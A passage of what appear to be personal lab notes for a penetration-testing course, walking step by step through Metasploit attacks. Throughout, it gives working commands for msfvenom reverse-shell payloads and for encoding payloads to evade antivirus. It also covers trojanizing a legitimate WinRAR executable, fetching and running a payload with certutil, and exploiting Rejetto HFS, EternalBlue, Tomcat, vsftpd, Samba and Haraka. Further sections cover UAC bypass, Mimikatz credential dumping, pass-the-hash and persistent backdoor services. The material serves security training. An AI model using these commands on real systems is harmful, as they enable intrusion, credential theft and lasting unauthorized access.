    osx/aarch64/meterpreter_reverse_tcp                                Run the Meterpreter / Mettle server payload (stageless)
    osx/aarch64/shell_bind_tcp                                         Bind an arbitrary command to an arbitrary port




## making payload for windows
> msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=ourip LPORT=portno -f exe > /path/to/where/you/want/to/save/payload.exe
	# your target specific payload



> msfvenom --list formats



## making payload for linux
> msfvenom -a x86 -p linux/meterpreter/reverse_tcp LHOST=ourip LPORT=portno -f elf > /path/to/where/you/want/to/save/payloadx86
> chmod +x payloadx86



## To transfer the files to target
> sudo python -m SimpleHTTPServer 80

## also setup the handler
> msfconsole
> use multi/handler
> set payload windows/meterpreter/reverse_tcp # for linux change that to linux
> set LHOST ourip
> set LPORT port
> run

# from the sever transfer the payload and run in the victim machine

```

### Encoding Payloads With Msfvenom

Given that this attack vector involves the transfer and storage of a malicious payload on the client's system (disk), attackers need to be cognizant of AV detection.

Most end-user AV solutions utilize signature-based detection in order to identify malicious files or executables.

**We can evade older signature-based AV solutions by encoding our payloads.**

Encoding is the process of modifying the payload shellcode with the objective of modifying the payload signature.

**Shellcode**
Shellcode (shell-code) is a piece of code typically used as a payload for exploitation.

It gets its name from the term command shell, whereby shellcode is a piece
of code that provides an attacker with a remote command shell on the target
system.

`x86/shikata_ga_nai`: A popular polymorphic encoder that is effective against many AV solutions.
`x86/countdown`: Another encoder that can be used, but may not be as effective as `shikata_ga_nai`.

```bash
>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -f exe -o encoded_payload.exe
	# output
	Attempting to encode payload with '1 iterations' of x86/shikata_ga_nai
	x86/shikata_ga_nai succeeded with size 381 (iteration=0)
	# here pay attention to 1 iteration we will discuss this later as its important
	# the more you iterate the better tha chance to evade the antivirus


# -i 10 for iterations
>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -i 10 -e x86/shikata_ga_nai -f exe -o encoded_payload.exe


## To transfer the files to target 
> sudo python -m SimpleHTTPServer 80

## also setup the handler
> msfconsole
> use multi/handler
> set payload windows/meterpreter/reverse_tcp # for linux change that to linux
> set LHOST ourip
> set LPORT port
> run

# from the sever transfer the payload and run in the victim machine

```

### Injecting Payloads Into Windows Portable Executables
```bash
>msfvenom


# for example we are using winrar file
# download the 'winrar'
>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -i 10 -e x86/shikata_ga_nai -f exe -x /path/to/orginial/file.exe > winrar.exe


> sudo python -m SimpleHTTPServer 80

## also setup the handler
> msfconsole
> use multi/handler
> set payload windows/meterpreter/reverse_tcp # for linux change that to linux
> set LHOST ourip
> set LPORT port
> run

# from the sever transfer the payload and run in the victim machine


$IMPORTANT
# after exploitation must run cmd
>run post/windows/manage/migrate


>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -i 10 -e x86/shikata_ga_nai -f exe -k -x /path/to/orginial/file.exe > winrar.exe
```

## Automating
### Automating MSF With Resource Scripts
Metasploit resource scripts are a great feature of MSF that allow you to automate repetitive tasks and commands.

They operate similarly to batch scripts, whereby, you can specify a set of Msfconsole commands that you want to execute sequentially.

You can the load the script with Msfconsole and automate the execution of the commands you specified in the resource script.

We can use resource scripts to automate various tasks like setting up multi handlers as well as loading and executing payloads.

```bash
# to see the available resource scripts
>ls -la /usr/share/metasploit-framework/scripts/resource

# now to automate the setup for 'multi/handler'
>nano handler.rc # scriptname.rc
	# here 'multi/handler'

# Write all things in sequence
use multi/handler
set payload windows/meterpreter/reverse_tcp # for linux change that to linux
set LHOST 10.10.10.10
set LPORT 1234
run
# save it where u can access it easily and then

>msfconsole -r handler.rc

## to load resource file
> resource ~/Desktop/handler.rc

```

------------
# Exploitation

## Windows Exploitation
### Exploiting A Vulnerable HTTP File Serverl
An HTTP File Server (HFS) is a web server that is designed for file & document sharing.

HTTP File Servers typically run on TCP port 80 and utilize the HTTP protocol for underlying communication.

Rejetto HFS is a popular free and open source HTTP file server that can be setup on both Windows and Linux.

Rejetto HFS V 2.3 is vulnerable to a remote command execution attack.

MSF has an exploit module that we can utilize to gain access to the target system hosting the HFS.
```bash
> service postgresql start
> msfconsole
> db_status
> workspace -a hsf
> setg RHOSTS ip
> setg RPORT port
> db_nmap -sS -sV -O ip
> search type:exploit name:rejetto
> use exploit/windows/http/rejetto_hfs_exec # Rejetto HttpFileServer Remote Command Execution
> options
> info
> run # you can change the payload x86 x64 etc




```

### Windows MS17-010 SMB Vulnerability
EternalB1ue 7-010/CVE-2017-0144) is the name given to a collection of Windows vulnerabilities and exploits that allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is a part of.

The EternalBlue exploit was developed by the NSA (National Security Agency) to take advantage of the MS17-010 vulnerability and was leaked to the public by a hacker group called the Shadow Brokers in 2017.

The EternalBlue exploit takes advantage of a vulnerability in the Windows SMBv1 protocol that allows attackers to send specially crafted packets that consequently facilitate the execution of arbitrary commands.

**MS17-010 EternalBlue Exploit**
+ The EternalBlue exploit was used in the WannaCry ransomware attack on June 27, 2017 to exploit other Windows systems across networks with the objective of spreading the ransomware to as many systems as possible.
+ This vulnerability affects multiple versions of Windows:

Windows Vista
Windows 7
Windows Server 2008
Windows 8.1
Windows Server 2012
Windows 10
Windows Server 2016
```bash
> service postgresql start
> msfconsole
> db_status
> workspace -a eternalBlue
> setg RHOSTS ip
> setg RPORT port
> db_nmap -sS -sV -O ip
> services # windows 7 vuln to eternal blue
> search type:auxiliary name:eternalblue
> use auxiliary/scanner/smb/smb_ms17_010 # RCE DETECTION
> options
> run # likely vuln to eternal blue

## Now exploitation
> search type:exploit name:eternalblue
> use exploit/windows/smb/ms17_010_eternalblue
> options
> run # get the meterpreter shell
```

### WinRM (Windows Remote Management Protocol)
Windows Remote Management (VVinRM) is a Windows remote management protocol that can be used to facilitate remote access with Windows systems over HTTP(S).

Microsoft implemented WinRM in to Windows in order to make life easier for system administrators.

WinRM is typically used in the following ways:
- Remotely access and interact with Windows hosts on a local network.
- Remotely access and execute commands on Windows systems.
- Manage and configure Windows systems remotely.
- WinRVl typically uses TCP port 5985 and 5986 (HTTPS).

**Exploiting WinRM**
- WinRM implements access control and security for communication between systems through various forms of authentication.
- We can utilize a utility called "crackmapexec" to perform a brute-force on WinRM in order to identify **users** and their **passwords** as well as execute commands on the target system.
- We can also utilize a ruby script called "evil-winrm" to obtain a command shell session on the target system.

```bash
> service postgresql start
> msfconsole
> db_status
> workspace -a winRM
> setg RHOSTS ip
> setg RPORT port
> db_nmap -sS -sV -O -p- ip
> services # still no winRM service running found

## soo we will use 
> search type:auxiliary name:winrm
> use auxiliary/scanner/winrm/winrm_auth_methods # WinRM Authentication Method Detection
> run # winrm is running //negotiate protocol supported

## login
> use auxiliary/scanner/winrm/winrm_login
> options
> set USER_FILE path/to/wordlist
> set PASS_FILE path/to/wordlist
> run # get the pass and username

## search winrm_cmd
> use auxiliary/scanner/winrm/winrm_md
> options
> set USERNAME admininstartor
> set PASSWORD twinkerbell
> run #


#####
> search winrm_script
> use 0
> options 
> set RHOSTS [ip]
> set RPORT [port]
> set FORCE_VBS true # force to use visual basic cmd stager
> set USERNAME username
> set PASSWORD password
> exploit # if successfull you will get the meterpreter shell

## in meterpreter session
>sysinfo
```

### Apache Tomcat Web Server
Apache Tomcatt also known as Tomcat server, is a popular, free and open source Java servlet web server.

It is used to build and host dynamic websites and web applications based on the Java software platform.

Apache Tomcat utilizes the HTTP protocol to facilitate the underlying communication between the server and clients.

Apache Tomcat runs on TCP port 8080 by default.


**Exploiting Apache Tomcat**
+ The standard Apache HTTP web server is used to host static and dynamic websites or web applications, typically developed in PHP.
+ The Apache Tomcat web server is primarily used to host dynamic websites or web applications developed in Java.
+ Apache Tomcat V8.5.19 is vulnerable to a remote code execution vulnerability that could potentially allow an attacker to upload and execute a JSP payload in order to gain remote to target server.
+ We can utilize a prebuilt MSF exploit module to exploit this vulnerability and consequently gain access to the target server.
```bash
# utilise the msf
> service postgresql start
> msfconsole
> workspace -a tomcat
> set RHOSTS ip
> db_nmap -sV -sS -O ip # appache tompcat running 
> services
> search type:exploit tomcat_jsp
> use exploit/multi/http/tomcat_jsp_upload_bypass # Tomcat RCE via JSP Upload Bypass
> options
> set RPORT 8080 ###
> set TARGETURI / # set to where the apache tomcat is located /path/to/tomcat
> info # to get info on the exploit we are using
> set payload java/jsp_shell_bind_tcp
> options
> set SHELL cmd # as window uses cmd
> run # if does not work just run again
	# we get cmd shell session not a meterpreter
> sysinfo
	'ctrtl+z' background the session

sessions




########## TO GET THE METERPRETER SESSION ########## 
+ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ourip LPORT=port -f exe > meterpreter.exe
+ ls

# set up a webserver
+ sudo python -m SimpleHTTPServer 80

## get back to the session which we put in background
+ sessions 1

### in the cmd session of victim machine lets download the exploit
+ certutil -urlcache -f http://ourip/meterpreter.exe meterpreter.exe
+ dir # check the upload
	# downloaded successfully



######## set up a handler in normal terminal ###########
# set up a handler 'here we are utlistising rc  script'
# now to automate the setup for 'multi/handler'
> nano handler.rc # scriptname.rc
	# here 'multi/handler'

# Write all things in sequence
use multi/handler
set payload windows/meterpreter/reverse_tcp # for linux change that to linux
set LHOST 10.10.44.4
set LPORT 1234
run
# save it where u can access it easily and then

> msfconsole -r handler.rc # run the rc script


# back to the CMD session 
# run the exploit in victim machine to get the meterpreter session 
+ .\meterpreter.exe


# in the handlers tab we will get the meterpreter session
> sysinfo # nt auhto

```

## CTF - MSF 1

> [CTF - MSF CTF 1](https://medium.com/@madhavan0731/host-network-penetration-testing-the-metasploit-framework-ctf-1-solved-a151b39f3886)

## Linux Exploitation
### FTP (File Transfer Protocol)
+ FTP (File Transfer Protocol) is a protocol that uses TCP port 21 and is used to facilitate file sharing between a server and client/clients.
+ It is also frequently used as a means of transferring files to and from the directory of a web server.
+ vsftpd is an FTP server for Unix-like systems including Linux systems and is the default FTP server for Ubuntu, CentOS and Fedora.
+ vsftpd V 2.34 is vulnerable to a command execution vulnerability that is facilitated by a malicious backdoor that was added to the vsftpd download archive through a supply chain attack.
```bash
# start the enumeration 
> service postgresql start
> msfconsole
> setg RHOSTS targetip
> db_namp -sV -sS -O targetip
+ services # found the vsftpd service running
+ hosts
+ search vfstpd
+ use exploit/unix/ftp/vsftpd_234_backdoor
+ options
+ run # this will give a shell 
+ shell 
+ /bin/bash -i
	'ctrl+z' background session



## now to change the shell session to meterpreter session
+ search shell_to_meterpreter
+ use 0
+ options
+ set session 1
+ run
```

### Exploiting Samba
SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a local network (LAN).

SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using port 139.

Samba is the Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.

Samba V 3.5.0 is vulnerable to a remote code execution vulnerability, allowing a malicious client to upload a shared library to a writable share, and then cause the server to load and execute it.

```bash
+ setg RHOSTS targetip
+ db_nmap -sV -sS -O targetip
+ services
+ hosts
+ search type:exploit name:samba
+ use exploit/linux/samba/is_known_pipename
+ set paylaod
+ check # to check if the target it vuln or not
+ run # got a cmd shell

'ctrl+z' background the session



## change the shell to meterpreter
+ search shell_to_meterpreter
+ use post/multi/manage/shell_to_meterpreter
+ options
+ set LHOST eth1
+ set SESSION 1
+ run # new Session is created with meterpreter session



## shift to meterpreter shell
+ sessions -i 2
+ getuid

```

### Exploiting SMTP Server
SSH (Secure Shell) is a remote administration protocol that offers encryption and is the successor to Telnet.
It is typically used for remote access to servers and systems.

SSH uses TCP port 22 by default, however, like other services, it can be configured to use any other open TCP port.

**libssh** is a multiplatform C library implementing the SSHv2 protocol on client and server side.

libssh VO.6.O-O.8.O is vulnerable to an authentication bypass vulnerability in the libssh server code that can be exploited to execute commands on the target server.
```bash
+ service postgresql start
+ msfconsole
+ setg RHOSTS demo.ine.local
+ db_nmap -sS -sV -O demo.ine.local
+ services #
+ search libssh_auth_bypass
+ options # change SPAWN_PTY 
+ set SPAWN_PTY true
+ run # session opened in background



## in shell
+ whoami
+ cat /etc/*release


## change the shell to meterpreter
+ search shell_to_meterpreter
+ use post/multi/manage/shell_to_meterpreter
+ options
+ set LHOST eth1
+ set SESSION 1
+ run # new Session is created with meterpreter session


## shift to meterpreter shell
+ sessions -i 2
+ getuid

```


### Exploiting SMTP
+ SMTP (Simple Mail Transfer Protocol) is a communication protocol that is used for the transmission of email.
+ SMTP uses TCP port 25 by default. It can also be configured to run on TCP port 465 and 587.
+ Haraka is an open source high performance SMTP server developed in Nodejs.
+ The Haraka SMTP server comes with a plugin for processing attachments. Haraka versions prior to V 2.8.9 are vulnerable to command injection.
```bash
+ service postgresql start
+ msfconsole
+ setg RHOSTS demo.ine.local
+ db_nmap -sS -sV -O demo.ine.local
+ services # smtp on port 25
+ search type:exploit name:haraka
+ use exploit/linux/smtp/haraka # Haraka SMTP Command Injection
+ options
+ set SRVPORT 9898
+ set SRVHOST ourip
+ set email_to root@attackdefense.test
+ set LHOST eth1
+ run # might show some error but thats okay



+ sessions
+ sessions -i 1
+ sysinfo
```

## Post Exploitation Fundamentals
### Meterpreter Fundamentals
Post exploitation refers to the actions performed on the target system after
initial access has been obtained. 

The post exploitation phase of a penetration test consists of various techniques like:
- Local Enumeration
- Privilege Escalation
- Dumping Hashes
- Establishing Persistence
- Clearing Your Tracks
- pivoting

**Meterpreter**
+ The Meterpreter (Meta-interpreter) payload is an advanced multi-functional payload that operates via DLL injection and is executed in memory on the target system, consequently making it difficult to detect.
+ It communicates over a stager socket and provides an attacker with an interactive command interpreter on the target system that facilitates the execution of system commands, file system navigation, keylogging and much more.
+ Meterpreter also allows us to load custom script and plugins dynamically.
+ MSF provides us with various types of meterpreter payloads that can be used based on the target environment and the OS architecture.

```bash
+ service postgresql start 
+ msfconsole 
+ setg RHOSTS demo.ine.local
+ db_nmap -sS -sV -O demo.ine.local

# to see the target in cli interface
+ curl http://demo.ine.local ## xoda service running found
+ search xoda
+ use exploit/unix/webapp/xoda_file_upload
+ options
+ set targeturi /
+ set payload 
+ run # gives meterpreter session
+ sysinfo # to get the info about system
+ getuid # 
+ help # to see cmds available
+ background / 'ctrl+z'
+ sessions
+ sessions -i 1
+ sessions -C sysinfo -i 1 # execite cmds without interacting with it
+ sessions -l
+ sessions -k 1 # kill
+ sessions -n xoda -i 1 # rename session
+ ls
+ pwd
+ cd ..
+ cd "directroty name" # line name
+ cat flag.txt
+ download flag.txt
+ checksum md5 /bin/bash # get a MD5 hash fpr a binary
+ getrnv TERM
+ search -d /urs/bin -f *backdoor*
+ search -f *.jpg*
+ shell
	+ /bin/bash -i
	## Now in shell we can do
	+ ps
	+ migrate 12323 # psid
+ mkdir
+ rmdir
```

### Upgrading Command Shells To Meterpreter Shells
```bash
## change the shell to meterpreter
+ search shell_to_meterpreter
+ use post/multi/manage/shell_to_meterpreter
+ options
+ set LHOST eth1
+ set SESSION 1
+ run # new Session is created with meterpreter session


## shift to meterpreter shell
+ sessions -i 2

######################### AUTOMATE THE ABOVE PROCESS ################
+ sessions -u 1 
```

## CTF - MSF 2

> [CTF - MSF CTF 2](https://systemweakness.com/host-network-penetration-testing-the-metasploit-framework-ctf-2-ejpt-ff047ebf86ab)

## Windows Post Exploitation

### Windows Post Exploitation Modules

The MSF provides us with various post exploitation modules for both Windows and Linux.

 We can utilize these post exploitation modules to enumerate information about the Windows system we currently have access to:
- Enumerate user privileges
- Enumerate logged on users
- VM check
- Enumerate installed programs
- Enumerate AVs
- Enumerate computers connected to domain
- Enumerate installed patches
- Enumerate shares
```bash
+ service postgresql start 
+ msfconsole 
+ setg RHOSTS demo.ine.local
+ db_nmap -sS -sV -O demo.ine.local # here in this case we have a vuln rejetto server
+ search rejetto
+ use exploit/windows/http/rejetto_hfs_exec
+ options
+ set RHOSTS demo.ine.local
+ run # gets a meterpreter shell
+ sysinfo
+ help # see the cmds we can use 
+ screenshot # to get an screenshot of the target machine 
+ getsystem # elevate privs
+ hashdump
+ getuid
+ show_mount # display drives attached to the target
+ ps 
+ migrate 3903
+ dir
+ ls
+ download flag.txt

'ctrl+z'
+ sessions
+ search upgrade platform:windows # upgrade session
+ use post/windows/manage/migrate
+ options


# post exploitation modules
+ search win_privs
+ use post/windows/gather/win_privs # identify what privs we have
+ options
+ set SESSION 1
+ run


### to check who logs in the target system
+ use post/windows/gather/enum_logged_on_users
+ search enum_logged_on
Name	 Current  Setting	Required   Description
'CURRENT'	 true	  yes	               Enumerate currently logged on users
'RECENT'	 true	  yes                  Enumerate Recently logged on users
'SESSION	'		  yes	               The session to run this module on.

+ set SESSION 1
+ run



## check if the target system is VM
+ search checkvm
+use post/windows/gather/checkvm
		"post/ solaris/gather/checkvm"
		"post/linux/gather/checkvm"
+ set SESSION 1
+ run # tell if its a VM or not



## check the programs that are installed on the target
+ search enum_applications
+ use post/windows/gather/enum_applications
+ show options
+ set SESSION 1
+ run


# to see the information we have collected so far
+ loot


# to check what anti-virus softwares are installed on the targeg
+ search type:post platform:windows enum_av
+ use post/windows/gather/enum_av_excluded
+ options
+ set SESSION 1
+ run




## to see if the target system is part of the domain or not
+ search enum_computer
+ use post/windows/gather/enum_computers
+ options
+ set SESSIONS 1
+ run



## to gather the applied patches on the target system
+ search enum_patches
+ use use post/windows/gather/enum_patches
+ options
+ set SESSION 1
+ run # migrate to another ps if gives a error

### to get this information mannually
### in a meterpreter session
+ shell
+ systeminfo # gives list of installed patches (hotfixes)



# to get the SHARES info
+ search enum_shares
+ use post/windows/gather/enum_shares
+ set SESSION 1
+ run


# to Check if RDP is enabled or not
+ search rdp platforn:windows
+ use post/windows/manage/enable_rdp
+ set SESSION 1
+ run

```

### Bypassing UAC
User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system.

UAC is used to ensure that changes to the operating system require approval from the administrator or a user account that is part of the local administrators group.

A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt. whereas a privileged user will be prompted with a consent prompt.

Attacks can bypass UAC in order to execute malicious executables with elevated privileges.

**Bypassing UAC**
In order to successfully bypass I-JAC, we will need to have access to a user account that is a part of the local administrators group on the Windows target system.

UAC allows a program to be executed with administrative privileges, consequently prompting the user for confirmation.

UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation.

There are multiple tools and techniques that can be used to bypass UAC, however, the tool and technique used will depend on the version of Windows running on the target system.


**Bypassing UAC With UACMe**
• UACMe is an open source, robust privilege escalation tool developed by @hfireOx. It can be used to bypass Windows UAC by leveraging various techniques.
o GitHub: https://github.com/hfirefOx/UACME
• The UACME GitHub repository contains a very well documented list of methods that can be used to bypass UAC on multiple versions of Windows ranging from Windows 7 to Windows 10.
• It allows attackers to execute malicious payloads on a Windows target with administrative/elevated privileges by abusing the inbuilt Windows AuteElevate tool.
• The UACMe GitHub repository has more than 6() exploits that can be used to bypass UAC depending on the version of Windows running on the target.

```bash
## we found a rejetto server running on the target which is vulnerable to particular exploit
> nmap [ip]
> sudo service postgresql start
> msfconsole
> setg RHOSTS [target_ip]
> search rejetto # as the server is running on rejetto
> use exploit/windows/http/rejetto_hfs_exec # ALLOW RCE
> set payload 
> exploit # if all good you will get the meterpreter shell


> sysinfo # to check x64
> getuid # to check current logged in user (you)
> getsystem # to elevate our privs ## denied 
> getprivs # get current privileges
> shell
> net users
> net localgroup administrators # enumerate admininstrator

# lets try to change the pass for user "admin"
> net user admin password123 # denied as we are not administrators
> 'ctrl+z'

####################################################################
$IMPORTANT_METHOD_1

> search bypassuac
> use exploit/windows/local/bypassuac_injection #windows Escalate UAC Protection Bypass (In Memory Injection)
> set payload windows/x64/meterpreter/reverse_tcp # x64, x86
> set LPORT 4433 # if needed 
> run # if target error occurs
> set TARGET Windows\ x64
> run # got meterpreter seession


## Now that we have disabled UAC we can elevate the privs
> getsystem # success
> getuid # nt auth
> hasdump




####################################################################
$IMPORTANT_METHOD_2

## in meterpreter shell
> sysinfo # to know the system for further exploitation

## the target is x86 so we can migrate to "explorer prcoesss"
> pgrep explorer # to get the explorer process id
> migrate 2248 # this will give us a x64 bit meterpreter shell
> 
######## NOW TIME TO USE UACMe ############
# terminate the shell session and get back to normal meterpreter session 

# go to akagai /desktop/tools/UACMe/akagai

1. In order to bypass the UAC consent check we have to use Akagi64.exe to execute the backdoorshell code on target. 
2. This will execute the backdoorshell code with Elevated privileges and gives us administrator privs.   
3. So to do this we have know about Akagi64.exe  
4. To send these on to the target system we have to upload these on to the target systems'Temp directory'. 
5. Use meterpreter shell to upload those files. 
6. Again, we need to create a payload which is when executed gives us elevated privs command shell. So to do this we use msfvenom 

> msfvenom -p windows/meterpreter/reverse_tcp LHOST=ourip LPORT=1234 -f exe > backdoor.exe

> msfconsole
> use multi/handler
> set payload windows/meterpreter/reverse_tcp
> set LHOST ourip
> set RPORT 1234
> run

## now to upload in temp
> cd \
> mkdir Temp
> cd Temp
> upload backdoor.exe
> upload path/to/the/Akagi64.exe
> shell
> dir # we can see the backdoor.exe & Akagi64.exe has been uploaded successfully

# but we can't execute them with admininstator priv as it will need UAC notification approval

# Usage: .\Akagi64.exe [Key] [Param] 
        1. Key is number which is the number of exploit  find this no. on github documentation
        2. Param is the path to the backdoorshell file.

> Akagi64.exe 23 C:\Temp\backdoor.exe

# this will get a meterperter session on the listening port "multi/handler"
> getuid # we are still in the non administrator account
> getprivs # we can see we have elevated privileges

# migrate to other process that has NT Authority privs
> ps 
> migrate 688 # lsass.exe
> getuid # now we have migrated to an administrator account
> hashdump

```



### Token Impersonation With Incognito
**Windows Access Tokens**
Windows access tokens are a core element of the authentication process on Windows and are created and managed by the Local Security Authority Subsystem Service (LSASS).

A Windows access token is responsible for identifying and describing the security context of a process or thread running on a system. Simply put. an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed.

Access tokens are generated by **the winlogon.exe** process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the userinit,exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.

Windows access tokens are categorized based on the varying security levels assigned to them.

These security levels are used to determine the privileges that are assigned to a specific token.

An access token will typically be assigned one of the following security levels:
- Impersonate-level tokens are created as a direct result of a non-interactive login on Windows. typically through specific system services or domain logons. 
- Delegate-level tokens are typically created through an interactive login on Windows, primarily through a traditional login or through remote access protocols such as RDP.

**Impersonate-level** tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.
**Delegate-level** tokens pose the largest threat as they can be used to impersonate tokens on any system.

**Windows Privileges**
The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available.

The following are the **privileges that are required for a successful impersonation attack**:
- SeAssignPrimaryToken: This allows a user to impersonate tokens.
- SeCreateToken: This allows a user to create an arbitrary token with administrative privileges.
- SelmpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges.

**TOOL**
**Incognito** is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation.

We can use the incognito module to display a list of available tokens.
```bash
> nmap demo.ine.local
	# we get the http server running on port 80
	# see for the info in browser

# The server is Running a rejetto service which is vuln
> sudo service postgresql start
> msfconsole
> search rejetto
> use exploit/windows/http/rejetto_hfs_exec

# payload it set to 32bit 
> options
> set LHOST ourip
> set RPORT port 
> set RHOSTS target_ip
> run # we will get a meterpreter session on the target
> sysinfo # architecture is 64bit so..  migrate
> pregp explorer
> migrate 4561 # action denied
> getuid # we are logged in as a "service" account
> getprivs # we have "SeImpersonatePrivilege"

# lets start 
> load incognito 
	# session might be terminated as we tried to migrate to a process but failed
	# so "run" the exploit module again
> run
> load incognito 
> list_tokens -u # list user account tokens
	# see the administrator account
	# copy the name of the access token "ATTACKDEFENSE\Administrator"
> impersonate_token "ATTACKDEFENSE\Administrator" 
> getuid # if successful u will get the admin privs but...
> getprivs # access denied so..
> hashdump # denied
> pregp explorer
> migrate 4561 # success
> getprivs # privs sucessfully escalated
> hasdump # success
> list_tokens -u
	# see the system admin
	# copy the name of the access token "NT AUTHORITY\SYSTEM"
> impersonate_token "NT AUTHORITY\SYSTEM"
> getuid # got access to system admin
> cat C:\\Users\\Administrator\\Desktop\\flag.txt
	
```

### Dumping Hashes With Mimikatz

- **Mimikatz Overview**:
  - A Windows post-exploitation tool created by Benjamin Delpy (@gentilkiwi).
  - Capable of extracting:
    - Clear-text passwords
    - Password hashes
    - Kerberos tickets from memory.

- **SAM Database**:
  - Stands for Security Account Manager.
  - A database file on Windows systems that stores hashed user passwords.

- **Hash Extraction**:
  - Mimikatz can extract password hashes from the memory of the `lsass.exe` process, where they are cached.

- **Usage Options**:
  - Can use a pre-compiled Mimikatz executable.
  - If a Meterpreter session is available on a Windows target, the inbuilt Meterpreter extension "Kiwi" can be utilized.

- **Privilege Requirement**:
  - Mimikatz requires elevated privileges to run correctly.

```bash
> nmap -sV targetip # running badblue http 2.7
> service postgresql start
> msfconsole
> search badblue
> use exploit/windows/http/badblue_passthru
> set RHOSTS targetip
> run # this will give a meterpreter shell

# in meterpreter
> sysinfo
> getuid # we are admin but we can highest priv that is nt auth
> ps
> pgrep lsass # get lsass pid
> migrate 780
> getuid # nt authority


## KIWI ##
> load kiwi
> ? # help menu
> creds_all
> lsa_dump_sam # hashes NTLM LM
> lsa_dump_secrets # hashes NTLM LM # next topics covers the use of hashes

> pwd 
> cd /
> mkdir Temp
> cd Temp
> upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
> shell 
> dir # stay in Temp dir
> .\mimikatz.exe
> privilege::debug # Privilege '20' OK
> lsadump::sam

## one good thing of mimikatz is it can show logon password is security is less
> logonpasswords 
```

### Pass-The-Hash Attacks

+ Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately.


+ We can use multiple tools to facilitate a Pass-The-Hash attack:
	+ Metasploit PsExec module
	+ Crackmapexec


+  This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation.

```bash
> nmap -sV targetip # running badblue http 2.7
> service postgresql start
> msfconsole
> search badblue
> use exploit/windows/http/badblue_passthru
> set RHOSTS targetip
> run # this will give a meterpreter shell

# in meterpreter
> sysinfo
> getuid # we are admin but we can highest priv that is nt auth
> pgrep lsass # get lsass pid
> migrate 780
> getuid # nt authority

## KIWI ##
> load kiwi
> ? # help menu
> creds_all
> lsa_dump_sam
> lsa_dump_secrets  

## copy paste the needed ntlm hashes
## but for pass the hash we need LM Hashes 
> hashdump # get LM hash 
## copy LM and NTLM hashes
ctrl +z # bcakground the session

> search psexec
> use exploit/windows/smb/psexec
> options
> set RHOSTS 
> set LPORT
> set SMBUser Admininstartor
> set SMBPass aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d # NTLM hash

## exploit completed but no session created soo...
> set target command
> set target Native\ upload # gives meterpreter
## now u can run the above module just by running this module


#################
	# you might see some errors but thats okayy 
> crackmapexec smb demo.ine.local -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" # NTLM hash
> crackmapexec smb demo.ine.local -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -X "ifconfig"

```

### Establishing Persistence On Windows
Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.

Gaining an initial •oothold is not enough, you need to setup and maintain persistent access to your targets.

We can utilize various post exploitation persistence modules to ensure that we always have access to the target system.

```bash
> nmap -sV targetip # running 
> service postgresql start
> msfconsole
> setg RHOSTS demo.ine.local
> db_nmap -sV -sS -O demo.ine.local
> search rejetto 
> use exploit/windows/http/rejetto_hfs_exec
> set LHOST ourip
> run # got the meterpreter session
> getuid
> sysinfo
"ctrl+z"


## to setup the persistence we need root privs
> search platform:persistence windows
> use exploit/windows/local/persistence_service # its better as it will give us access even after restart.. this will create a persistence service
> set payload windows/x64/meterpreter/reverse_tcp #32 64 86
> options # SERVICE_NAME # to make it seem like a normal service give it a good naem
> set SESSION 1
> getuid # we got access


## now even if we will kill all the session we will still have the acces to the machine
> sessions -K

# now to get the meterpreter session again
# set the values we did above same as that
> use multi/handler
> options
> set payload windows/meterpreter/ reverse tcp
> set LHOST eth1
> run
 
```

### Enabling RDP

+ The Remote Desktop Protocol (RDP) is a proprietary GUI remote access protocol developed by Microsoft and is used to remotely connect and interact with a Windows system.
+ RDP uses TCP port **3389** by default.
+ RDP is disabled by default, however, we can utilize an MSF exploit module to enable RDP on the Windows target and consequently utilize RDP to remotely access to the target system.
+ RDP authentication requires a legitimate user account on the target system as well as the user's password in clear-text.

```bash
> service postgresql start
> msfconsole
> setg RHOSTS demo.ine.local
> db_nmap -sV -sS -O demo.ine.local 
> search badblue
> use exploit/windows/http/badblue_passthru
> options
> run # this will give a meterpreter shell
> getuid
> sysinfo

"ctrl+z"

# to Check if RDP is enabled or not
+ search rdp platforn:windows
+ use post/windows/manage/enable_rdp
+ set SESSION 1
+ run


## to change the password if u want.. but not recommended
> net users
> net user admininstrator hacker_123 # need admin privs for this




#################################################3
> xfreerdp /u:administrator /p:hacker_123 /v:10.2.19.254 # will open a GUI for target machine

```


### Windows Keylogging
Keylogging is the process of recording or capturing the keystrokes entered on a target system.

This technique is not limited to post exploitation, there are plenty of programs and USB devices that can be used to capture and transmit the keystrokes entered on a system.

Meterpreter on a Windows system provides us with the ability to capture the keystrokes entered on a target system and download them back to our local system.

```bash
> service postgresql start
> msfconsole
> setg RHOSTS demo.ine.local
